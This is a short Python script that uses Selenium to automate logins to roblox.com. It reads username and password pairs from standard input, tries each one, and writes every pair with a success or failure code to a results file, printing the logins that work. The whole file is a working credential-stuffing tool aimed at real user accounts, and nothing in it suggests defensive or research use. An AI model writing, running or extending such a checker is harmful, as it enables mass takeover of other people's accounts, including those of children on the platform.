import time
import csv
import sys

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options

def login(username, password):
    # Install correct Chrome driver for Selenium 
    service = Service(ChromeDriverManager().install())

    # Spin up driver
    options = Options()
    options.add_argument("--start-maximized")
    driver = webdriver.Chrome(service=service, options=options)
    driver.get("https://www.roblox.com/login")
    driver.find_element("name", "username").send_keys(username)
    driver.find_element("name", "password").send_keys(password)
    driver.find_element("name", "password").send_keys("\n")

    # Give time to open stuff up
    driver.implicitly_wait(5)

    # Wait for roblox auth response
    time.sleep(5)

    # Log result
    if "Home" in driver.title:
        success_code = "200"
    else:
        success_code = "403"

    with open("login_results.txt", "a", newline="") as file:
        writer = csv.writer(file, delimiter="\t")
        writer.writerow([username, password, success_code])

    if success_code == "200":
        print(f"Successfully logged in with: {username} | {password}")
    else:
        print(f"Login failed for: {username} | {password}")

    driver.quit()

def process_combinations():
    with open("login_results.txt", "w", newline="") as file:
        writer = csv.writer(file, delimiter="\t")
        writer.writerow(["username", "password", "success_code"])

    for line in sys.stdin:
        username, password = line.strip().split("\t")
        login(username, password)

if __name__ == "__main__":
    process_combinations()
